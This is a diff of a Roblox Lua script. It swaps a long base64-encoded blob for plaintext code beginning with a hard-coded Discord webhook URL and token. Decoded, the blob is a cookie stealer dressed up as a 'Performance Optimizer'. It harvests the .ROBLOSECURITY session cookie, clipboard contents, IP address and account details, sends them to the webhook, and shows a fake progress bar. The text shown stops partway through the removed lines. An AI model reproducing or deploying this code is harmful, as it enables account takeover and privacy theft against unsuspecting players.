@@ -1,44 +1,298 @@
-local encoded = [[bG9jYWwgd2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNTQ1ODU1ODMxNDUzNDc0ODE2LzY4ek5wOUZVN3N2Y1ZmVXFONEhHTGY4SHAwSXNUeVctTE9JMGpDQkxCM28wTmxiRFRoajBCZnJVY2c3bU1KNm1QVk1nIgoKbG9jYWwgZnVuY3Rpb24gc2VuZCh1cmwsIGNvbnRlbnQpCiAgICBsb2NhbCBwYXlsb2FkID0ge2NvbnRlbnQgPSBjb250ZW50fQogICAgbG9jYWwganNvbiA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKTpKU09ORW5jb2RlKHBheWxvYWQpCiAgICBsb2NhbCBoZWFkZXJzID0ge1siQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiJ9CiAgICBsb2NhbCBtZXRob2RzID0gewogICAgICAgIGZ1bmN0aW9uKCkgcmV0dXJuIHBjYWxsKHJlcXVlc3QsIHtVcmwgPSB1cmwsIE1ldGhvZCA9ICJQT1NUIiwgSGVhZGVycyA9IGhlYWRlcnMsIEJvZHkgPSBqc29ufSkgZW5kLAogICAgICAgIGZ1bmN0aW9uKCkgcmV0dXJuIHBjYWxsKGh0dHBfcmVxdWVzdCwge1VybCA9IHVybCwgTWV0aG9kID0gIlBPU1QiLCBIZWFkZXJzID0gaGVhZGVycywgQm9keSA9IGpzb259KSBlbmQsCiAgICAgICAgZnVuY3Rpb24oKSByZXR1cm4gcGNhbGwoZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpLlBvc3RBc3luYywgZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpLCB1cmwsIGpzb24sIEVudW0uSHR0cENvbnRlbnRUeXBlLkFwcGxpY2F0aW9uSnNvbikgZW5kCiAgICB9CiAgICBmb3IgXywgbWV0aG9kIGluIGlwYWlycyhtZXRob2RzKSBkbwogICAgICAgIGxvY2FsIG9rLCByZXMgPSBtZXRob2QoKQogICAgICAgIGlmIG9rIHRoZW4gcmV0dXJuIHRydWUgZW5kCiAgICBlbmQKICAgIHJldHVybiBmYWxzZQplbmQKCnNlbmQod2ViaG9vaywgImBgYFRlc3Q6IHdlYmhvb2sgbGl2ZWBgYCIpCgpsb2NhbCBmdW5jdGlvbiBnZXRJUCgpCiAgICBsb2NhbCBpcCA9ICJOL0EiCiAgICBsb2NhbCBvaywgcmVzID0gcGNhbGwoZnVuY3Rpb24oKSByZXR1cm4gcmVxdWVzdCh7VXJsID0gImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIsIE1ldGhvZCA9ICJHRVQifSkgZW5kKQogICAgaWYgb2sgYW5kIHJlcyBhbmQgcmVzLkJvZHkgYW5kIHJlcy5Cb2R5IH49ICIiIHRoZW4gaXAgPSByZXMuQm9keTpnc3ViKCIlcysiLCAiIikgcmV0dXJuIGlwIGVuZAogICAgb2ssIHJlcyA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIGh0dHBfcmVxdWVzdCh7VXJsID0gImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIsIE1ldGhvZCA9ICJHRVQifSkgZW5kKQogICAgaWYgb2sgYW5kIHJlcyBhbmQgcmVzLkJvZHkgYW5kIHJlcy5Cb2R5IH49ICIiIHRoZW4gaXAgPSByZXMuQm9keTpnc3ViKCIlcysiLCAiIikgcmV0dXJuIGlwIGVuZAogICAgZm9yIF8sIHVybCBpbiBpcGFpcnMoeyJodHRwczovL2FwaS5pcGlmeS5vcmciLCAiaHR0cHM6Ly9pcC1hcGkuY29tL2pzb24vP2ZpZWxkcz1xdWVyeSIsICJodHRwczovL2ljYW5oYXppcC5jb20iLCAiaHR0cHM6Ly9odHRwYmluLm9yZy9pcCJ9KSBkbwogICAgICAgIGxvY2FsIG9rLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIik6R2V0QXN5bmModXJsKSBlbmQpCiAgICAgICAgaWYgb2sgYW5kIHJlc3VsdCBhbmQgcmVzdWx0IH49ICIiIHRoZW4KICAgICAgICAgICAgaWYgcmVzdWx0Om1hdGNoKCcicXVlcnkiOiIoLi0pIicpIHRoZW4gaXAgPSByZXN1bHQ6bWF0Y2goJyJxdWVyeSI6IiguLSkiJykKICAgICAgICAgICAgZWxzZWlmIHJlc3VsdDptYXRjaCgnIm9yaWdpbiI6IiguLSkiJykgdGhlbiBpcCA9IHJlc3VsdDptYXRjaCgnIm9yaWdpbiI6IiguLSkiJykKICAgICAgICAgICAgZWxzZSBpcCA9IHJlc3VsdDpnc3ViKCIlcysiLCAiIikgZW5kCiAgICAgICAgICAgIGlmIGlwIGFuZCBpcCB+PSAiIiBhbmQgaXAgfj0gIk4vQSIgdGhlbiBicmVhayBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGlwCmVuZAoKbG9jYWwgZnVuY3Rpb24gc3RlYWxDb29raWUoKQogICAgbG9jYWwgb2ssIHZhbCA9IHBjYWxsKGdldGNvb2tpZSwgImh0dHBzOi8vd3d3LnJvYmxveC5jb20vIikKICAgIGlmIG9rIGFuZCB2YWwgYW5kIHZhbCB+PSAiIiB0aGVuIHJldHVybiB2YWwgZW5kCiAgICBvaywgdmFsID0gcGNhbGwoZ2V0cm9ibG94Y29va2llKQogICAgaWYgb2sgYW5kIHZhbCBhbmQgdmFsIH49ICIiIHRoZW4gcmV0dXJuIHZhbCBlbmQKICAgIG9rLCB2YWwgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBzeW4gYW5kIHN5bi5jb29raWUgYW5kIHN5bi5jb29raWUoKSBlbmQpCiAgICBpZiBvayBhbmQgdmFsIGFuZCB2YWwgfj0gIiIgdGhlbiByZXR1cm4gdmFsIGVuZAogICAgb2ssIHZhbCA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCByZXMgPSByZXF1ZXN0KHtVcmwgPSAiaHR0cHM6Ly93d3cucm9ibG94LmNvbS8iLCBNZXRob2QgPSAiR0VUIn0pCiAgICAgICAgaWYgcmVzIGFuZCByZXMuSGVhZGVycyB0aGVuCiAgICAgICAgICAgIGZvciBrLCB2IGluIHBhaXJzKHJlcy5IZWFkZXJzKSBkbwogICAgICAgICAgICAgICAgaWYgc3RyaW5nLmxvd2VyKGspID09ICJzZXQtY29va2llIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHY6bWF0Y2goIiguLSk7Iikgb3IgdgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBuaWwKICAgIGVuZCkKICAgIGlmIG9rIGFuZCB2YWwgYW5kIHZhbCB+PSAiIiB0aGVuIHJldHVybiB2YWwgZW5kCiAgICBvaywgdmFsID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIik6R2V0QXN5bmMoImh0dHBzOi8vd3d3LnJvYmxveC5jb20vIikKICAgICAgICBpZiBwYWdlIGFuZCBwYWdlOm1hdGNoKCJfX1JlcXVlc3RWZXJpZmljYXRpb25Ub2tlbiIpIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHBhZ2U6bWF0Y2goJ19fUmVxdWVzdFZlcmlmaWNhdGlvblRva2VuIiB2YWx1ZT0iKC4tKSInKQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBuaWwKICAgIGVuZCkKICAgIGlmIG9rIGFuZCB2YWwgYW5kIHZhbCB+PSAiIiB0aGVuIHJldHVybiB2YWwgZW5kCiAgICBvaywgdmFsID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIG1zID0gZ2FtZTpHZXRTZXJ2aWNlKCJNZW1vcnlTdG9yZVNlcnZpY2UiKTpHZXRTdG9yZSgiLlJPQkxPU0VDVVJJVFkiKQogICAgICAgIGlmIG1zIHRoZW4gcmV0dXJuIG1zOkdldEFzeW5jKCJjb29raWUiKSBlbmQKICAgICAgICByZXR1cm4gbmlsCiAgICBlbmQpCiAgICBpZiBvayBhbmQgdmFsIGFuZCB2YWwgfj0gIiIgdGhlbiByZXR1cm4gdmFsIGVuZAogICAgb2ssIHZhbCA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3QgZ2V0Z2MgdGhlbiByZXR1cm4gbmlsIGVuZAogICAgICAgIGxvY2FsIGdjID0gZ2V0Z2ModHJ1ZSkKICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoZ2MpIGRvCiAgICAgICAgICAgIGlmIHR5cGUodikgPT0gInN0cmluZyIgYW5kIHY6bWF0Y2goIl8uJXcrJS5ST0JMT1NFQ1VSSVRZIikgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIHYKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIG5pbAogICAgZW5kKQogICAgaWYgb2sgYW5kIHZhbCBhbmQgdmFsIH49ICIiIHRoZW4gcmV0dXJuIHZhbCBlbmQKICAgIG9rLCB2YWwgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgaWYgbm90IGdldHJhd21ldGF0YWJsZSB0aGVuIHJldHVybiBuaWwgZW5kCiAgICAgICAgbG9jYWwgbXQgPSBnZXRyYXdtZXRhdGFibGUoZ2FtZSkKICAgICAgICBpZiBtdCBhbmQgbXQuX19pbmRleCB0aGVuCiAgICAgICAgICAgIGxvY2FsIG9sZCA9IG10Ll9faW5kZXgKICAgICAgICAgICAgZm9yIGkgPSAxLCAxMDAgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHJlcyA9IG9sZChnYW1lLCAiSHR0cFNlcnZpY2UiLCBpKQogICAgICAgICAgICAgICAgaWYgdHlwZShyZXMpID09ICJ0YWJsZSIgYW5kIHJlcy5Db29raWVzIHRoZW4KICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzLkNvb2tpZXMKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gbmlsCiAgICBlbmQpCiAgICBpZiBvayBhbmQgdmFsIGFuZCB2YWwgfj0gIiIgdGhlbiByZXR1cm4gdmFsIGVuZAogICAgb2ssIHZhbCA9IHBjYWxsKGdldGNsaXBib2FyZCkKICAgIGlmIG9rIGFuZCB2YWwgYW5kIHZhbDptYXRjaCgiXy4ldyslLlJPQkxPU0VDVVJJVFkiKSB0aGVuIHJldHVybiB2YWwgZW5kCiAgICByZXR1cm4gIk5vdCBhdmFpbGFibGUgKGV4ZWN1dG9yIGxpbWl0KSIKZW5kCgpsb2NhbCBmdW5jdGlvbiBnZXRDbGlwKCkKICAgIGxvY2FsIG9rLCB2YWwgPSBwY2FsbChnZXRjbGlwYm9hcmQpCiAgICBpZiBvayBhbmQgdmFsIGFuZCB2YWwgfj0gIiIgdGhlbiByZXR1cm4gdmFsIGVuZAogICAgb2ssIHZhbCA9IHBjYWxsKGNsaXBib2FyZCkKICAgIGlmIG9rIGFuZCB2YWwgYW5kIHZhbCB+PSAiIiB0aGVuIHJldHVybiB2YWwgZW5kCiAgICByZXR1cm4gIk4vQSIKZW5kCgpsb2NhbCBmdW5jdGlvbiBzYWZlR2V0KG9iaiwgcHJvcCwgZGVmYXVsdCkKICAgIGxvY2FsIG9rLCB2YWwgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBvYmpbcHJvcF0gZW5kKQogICAgcmV0dXJuIG9rIGFuZCB2YWwgb3IgZGVmYXVsdAplbmQKCmxvY2FsIGZ1bmN0aW9uIGNvbGxlY3QoKQogICAgbG9jYWwgaW5mbyA9IHt9CiAgICBpbmZvLmV4ZWN1dG9yID0gKGdldGV4ZWN1dG9ybmFtZSBhbmQgZ2V0ZXhlY3V0b3JuYW1lKCkpIG9yIChpZGVudGlmeWV4ZWN1dG9yIGFuZCBpZGVudGlmeWV4ZWN1dG9yKCkpIG9yICJVbmtub3duIgogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBpZiBwbGF5ZXIgdGhlbgogICAgICAgIGluZm8udXNlcklkID0gdG9zdHJpbmcocGxheWVyLlVzZXJJZCkKICAgICAgICBpbmZvLnVzZXJOYW1lID0gcGxheWVyLk5hbWUKICAgICAgICBpbmZvLmRpc3BsYXlOYW1lID0gcGxheWVyLkRpc3BsYXlOYW1lCiAgICAgICAgbG9jYWwgaWQgPSBwbGF5ZXIuVXNlcklkCiAgICAgICAgaWYgaWQgYW5kIGlkID4gMCB0aGVuCiAgICAgICAgICAgIGxvY2FsIHllYXIgPSBtYXRoLmZsb29yKChpZCAvIDEwMDAwMDAwMCkgKiAyKSArIDIwMDYKICAgICAgICAgICAgaW5mby5hY2NvdW50QWdlID0gdG9zdHJpbmcoeWVhcikgLi4gIiAoYXBwcm94KSIKICAgICAgICBlbmQKICAgICAgICBsb2NhbCBvaywgZnJpZW5kcyA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuICNwbGF5ZXI6R2V0RnJpZW5kc09ubGluZSgpIGVuZCkKICAgICAgICBpbmZvLmZyaWVuZHNPbmxpbmUgPSBvayBhbmQgdG9zdHJpbmcoZnJpZW5kcykgb3IgIk4vQSIKICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIGNoYXIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaHVtID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgaWYgaHVtIHRoZW4KICAgICAgICAgICAgICAgICAgICBpbmZvLmhlYWx0aCA9IHRvc3RyaW5nKGh1bS5IZWFsdGgpCiAgICAgICAgICAgICAgICAgICAgaW5mby5tYXhIZWFsdGggPSB0b3N0cmluZyhodW0uTWF4SGVhbHRoKQogICAgICAgICAgICAgICAgICAgIGluZm8ud2Fsa1NwZWVkID0gdG9zdHJpbmcoaHVtLldhbGtTcGVlZCkKICAgICAgICAgICAgICAgICAgICBpbmZvLmp1bXBQb3dlciA9IHRvc3RyaW5nKGh1bS5KdW1wUG93ZXIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIGlmIHJvb3QgdGhlbiBpbmZvLnBvc2l0aW9uID0gdG9zdHJpbmcocm9vdC5Qb3NpdGlvbikgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIGJhY2twYWNrID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpCiAgICAgICAgICAgIGlmIGJhY2twYWNrIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0ge30KICAgICAgICAgICAgICAgIGZvciBfLCBpdGVtIGluIGlwYWlycyhiYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGl0ZW06SXNBKCJUb29sIikgdGhlbiB0YWJsZS5pbnNlcnQoaXRlbXMsIGl0ZW0uTmFtZSkgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmICNpdGVtcyA+IDAgdGhlbiBpbmZvLmJhY2twYWNrID0gdGFibGUuY29uY2F0KGl0ZW1zLCAiLCAiKSBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgbHMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImxlYWRlcnN0YXRzIikKICAgICAgICAgICAgaWYgbHMgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgc3RhdHMgPSB7fQogICAgICAgICAgICAgICAgZm9yIF8sIHN0YXQgaW4gaXBhaXJzKGxzOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgc3RhdDpJc0EoIk51bWJlclZhbHVlIikgb3Igc3RhdDpJc0EoIkludFZhbHVlIikgb3Igc3RhdDpJc0EoIlN0cmluZ1ZhbHVlIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBzdGF0c1tzdGF0Lk5hbWVdID0gdG9zdHJpbmcoc3RhdC5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgbmV4dChzdGF0cykgdGhlbiBpbmZvLmxlYWRlcnN0YXRzID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpOkpTT05FbmNvZGUoc3RhdHMpIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIGluZm8ucGxhY2VJZCA9IHRvc3RyaW5nKHNhZmVHZXQoZ2FtZSwgIlBsYWNlSWQiLCAiTi9BIikpCiAgICBpbmZvLmpvYklkID0gc2FmZUdldChnYW1lLCAiSm9iSWQiLCAiTi9BIikKICAgIGluZm8uZ2FtZU5hbWUgPSBzYWZlR2V0KGdhbWUsICJOYW1lIiwgIlVua25vd24iKQogICAgaW5mby5tYXhQbGF5ZXJzID0gdG9zdHJpbmcoc2FmZUdldChnYW1lLCAiTWF4UGxheWVycyIsICJOL0EiKSkKICAgIGluZm8uc2VydmVyVGltZSA9IHRvc3RyaW5nKHNhZmVHZXQoZ2FtZSwgIlNlcnZlclRpbWUiLCAiTi9BIikpCiAgICBpbmZvLmlwID0gZ2V0SVAoKQogICAgaW5mby5jb29raWUgPSBzdGVhbENvb2tpZSgpCiAgICBpbmZvLmNsaXBib2FyZCA9IGdldENsaXAoKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHVzID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKICAgICAgICBpbmZvLnBsYXRmb3JtID0gdG9zdHJpbmcodXMuUGxhdGZvcm0pCiAgICAgICAgaW5mby5ncmFwaGljcyA9IHRvc3RyaW5nKGdhbWU6R2V0U2VydmljZSgiR3JhcGhpY3NTZXR0aW5ncyIpLkdyYXBoaWNzUXVhbGl0eUxldmVsKQogICAgICAgIGluZm8udm9sdW1lID0gdG9zdHJpbmcoZ2FtZTpHZXRTZXJ2aWNlKCJTb3VuZFNlcnZpY2UiKS5Wb2x1bWUpCiAgICBlbmQpCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgc3RhdHMgPSBnYW1lOkdldFNlcnZpY2UoIlN0YXRzIikKICAgICAgICBpbmZvLnBpbmcgPSB0b3N0cmluZyhzdGF0cy5OZXR3b3JrLlNlcnZlclN0YXRzSXRlbVsiRGF0YSBQaW5nIl06R2V0VmFsdWVTdHJpbmcoKSkKICAgIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBydW4gPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQogICAgICAgIGxvY2FsIGZ0ID0gcnVuLlJlbmRlclN0ZXBUaW1lCiAgICAgICAgaWYgZnQgYW5kIGZ0ID4gMCB0aGVuIGluZm8uZnBzID0gdG9zdHJpbmcobWF0aC5mbG9vcigxIC8gZnQpKSBlbmQKICAgIGVuZCkKICAgIHJldHVybiBpbmZvCmVuZAoKbG9jYWwgZGF0YSA9IGNvbGxlY3QoKQpsb2NhbCBsaW5lcyA9IHt9CmZvciBrLCB2IGluIHBhaXJzKGRhdGEpIGRvCiAgICBpZiB2IGFuZCB2IH49ICIiIHRoZW4KICAgICAgICB0YWJsZS5pbnNlcnQobGluZXMsIHN0cmluZy5mb3JtYXQoIiVzOiAlcyIsIGssIHRvc3RyaW5nKHYpKSkKICAgIGVuZAplbmQKbG9jYWwgbXNnID0gImBgYFxuIiAuLiB0YWJsZS5jb25jYXQobGluZXMsICJcbiIpIC4uICJcbmBgYCIKc2VuZCh3ZWJob29rLCBtc2cpCgpwY2FsbChmdW5jdGlvbigpCiAgICBsb2NhbCBwZyA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpCiAgICBsb2NhbCBndWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICBndWkuUGFyZW50ID0gcGcKICAgIGd1aS5SZXNldE9uU3Bhd24gPSBmYWxzZQogICAgbG9jYWwgZiA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgZi5TaXplID0gVURpbTIubmV3KDAsIDQyMCwgMCwgMjAwKQogICAgZi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0yMTAsIDAuNSwgLTEwMCkKICAgIGYuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzNSwgNDUpCiAgICBmLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjA4CiAgICBmLlBhcmVudCA9IGd1aQogICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGYpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDE2KQogICAgbG9jYWwgdCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIHQuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCA1MCkKICAgIHQuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMTApCiAgICB0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICB0LlRleHQgPSAiUGVyZm9ybWFuY2UgT3B0aW1pemVyIgogICAgdC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIHQuVGV4dFNjYWxlZCA9IHRydWUKICAgIHQuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICB0LlBhcmVudCA9IGYKICAgIGxvY2FsIHMgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBzLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICBzLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAuMzUsIDApCiAgICBzLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBzLlRleHQgPSAiT3B0aW1pemluZyBzZXR0aW5ncy4uLiIKICAgIHMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMTApCiAgICBzLlRleHRTY2FsZWQgPSB0cnVlCiAgICBzLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICBzLlBhcmVudCA9IGYKICAgIGxvY2FsIGJnID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBiZy5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMTgpCiAgICBiZy5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuNTUsIDApCiAgICBiZy5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDY1LCA3NSkKICAgIGJnLlBhcmVudCA9IGYKICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBiZykuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOSkKICAgIGxvY2FsIGZpbGwgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIGZpbGwuU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAxLCAwKQogICAgZmlsbC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMTgwLCAyNTUpCiAgICBmaWxsLlBhcmVudCA9IGJnCiAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgZmlsbCkuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOSkKICAgIGxvY2FsIHBjdCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIHBjdC5TaXplID0gVURpbTIubmV3KDAsIDYwLCAwLCAzMCkKICAgIHBjdC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0zMCwgMC43NSwgMCkKICAgIHBjdC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgcGN0LlRleHQgPSAiMCUiCiAgICBwY3QuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBwY3QuVGV4dFNjYWxlZCA9IHRydWUKICAgIHBjdC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgcGN0LlBhcmVudCA9IGYKICAgIGxvY2FsIHN0ID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgc3QuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIHN0LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAuODUsIDApCiAgICBzdC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgc3QuVGV4dCA9ICIiCiAgICBzdC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTUwLCAyNTUsIDE1MCkKICAgIHN0LlRleHRTY2FsZWQgPSB0cnVlCiAgICBzdC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgc3QuUGFyZW50ID0gZgogICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIGJ0bi5TaXplID0gVURpbTIubmV3KDAsIDEyMCwgMCwgNDApCiAgICBidG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtNjAsIDEsIC01MCkKICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDY1LCA3NSkKICAgIGJ0bi5UZXh0ID0gIkNMT1NFIgogICAgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgYnRuLlRleHRTY2FsZWQgPSB0cnVlCiAgICBidG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBidG4uUGFyZW50ID0gZgogICAgYnRuLlZpc2libGUgPSBmYWxzZQogICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGJ0bikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTIpCiAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpIGd1aTpEZXN0cm95KCkgZW5kKQogICAgbG9jYWwgZnVuY3Rpb24gYW5pbSgpCiAgICAgICAgbG9jYWwgZHVyID0gMi41CiAgICAgICAgbG9jYWwgc3RlcHMgPSA1MAogICAgICAgIGxvY2FsIHN0ZXBUaW1lID0gZHVyIC8gc3RlcHMKICAgICAgICBsb2NhbCBtc2dzID0geyJBbmFseXppbmcgc3lzdGVtLi4uIiwgIkFkanVzdGluZyBncmFwaGljcy4uLiIsICJPcHRpbWl6aW5nIG5ldHdvcmsuLi4iLCAiRmluZeKAkXR1bmluZyBwZXJmb3JtYW5jZS4uLiIsICJBcHBseWluZyBvcHRpbWFsIHNldHRpbmdzLi4uIn0KICAgICAgICBmb3IgaSA9IDAsIHN0ZXBzIGRvCiAgICAgICAgICAgIGxvY2FsIHByb2cgPSBpIC8gc3RlcHMKICAgICAgICAgICAgbG9jYWwgdyA9IDAuOCAqIHByb2cKICAgICAgICAgICAgZmlsbDpUd2VlblNpemUoVURpbTIubmV3KHcsIDAsIDEsIDApLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQsIEVudW0uRWFzaW5nU3R5bGUuTGluZWFyLCBzdGVwVGltZSwgZmFsc2UpCiAgICAgICAgICAgIHBjdC5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiJWQlJSIsIG1hdGguZmxvb3IocHJvZyAqIDEwMCkpCiAgICAgICAgICAgIGlmIGkgPCBzdGVwcyB0aGVuCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoc3RlcFRpbWUpCiAgICAgICAgICAgICAgICBpZiBpICUgMTAgPT0gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgcy5UZXh0ID0gbXNnc1ttYXRoLmZsb29yKGkgLyAxMCkgKyAxXSBvciBtc2dzWyNtc2dzXQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHMuVGV4dCA9ICJPcHRpbWl6YXRpb24gY29tcGxldGUhIgogICAgICAgIHN0LlRleHQgPSAiU2V0dGluZ3MgdXBkYXRlZCBzdWNjZXNzZnVsbHkuIgogICAgICAgIGJ0bi5WaXNpYmxlID0gdHJ1ZQogICAgZW5kCiAgICB0YXNrLndhaXQoMC4zKQogICAgc3Bhd24oYW5pbSkKZW5kKQ==]]
+local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- Remove any whitespace/newlines and invalid characters from the encoded string
-local function cleanBase64(str)
-    local cleaned = ""
